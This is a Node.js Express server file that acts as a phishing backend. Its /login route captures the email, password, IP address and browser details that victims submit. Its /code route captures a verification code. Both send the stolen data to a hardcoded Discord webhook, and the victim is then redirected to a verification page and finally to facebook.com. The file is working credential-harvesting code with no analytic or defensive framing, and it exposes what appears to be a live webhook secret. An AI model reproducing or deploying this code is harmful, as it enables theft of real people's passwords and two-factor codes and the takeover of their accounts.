const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios")

const app = express();

const webhookURL = "https://discord.com/api/webhooks/1342084759517397083/YjZTFI3rhXgs5e2nr3Vk47FWyZo8_PJtwkXoj4DFFdnnpLrHSQsIpGMJyyrkm6hXEIhl"
const PORT = process.env.PORT || 3000;


app.use(bodyParser.urlencoded({ extended: true }));
app.use("/", express.static("views/"));

// Function to get user IP
function getUserIP(req) {
    return req.headers["x-forwarded-for"] || req.connection.remoteAddress;
}

function sendDiscord(data) {
    axios.post(webhookURL, { content: data })
  .then(() => console.log("Message sent!"))
  .catch(err => console.error("Error:", err));
}

app.post("/login", (req, res) => {
    let { email, password } = req.body;
    let ip = getUserIP(req);
    let userAgent = req.headers["user-agent"]; // Get browser info

    let data = `EMAIL: ${email}
PASSWORD: ${password}
IP: ${ip}
UserAgent: ${userAgent}
`

    sendDiscord(data)
    // Redirect after 5 seconds
    setTimeout(() => {
        res.redirect("verification.html");
    }, 5000);
});

app.post("/code", (req, res) => {
    const { code } = req.body;
    const ip = getUserIP(req);
    const userAgent = req.headers["user-agent"];

    let data = `CODE: ${code}
IP: ${ip}
UserAgent: ${userAgent}`

    sendDiscord(data)
    
    
    res.redirect("https://facebook.com")
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
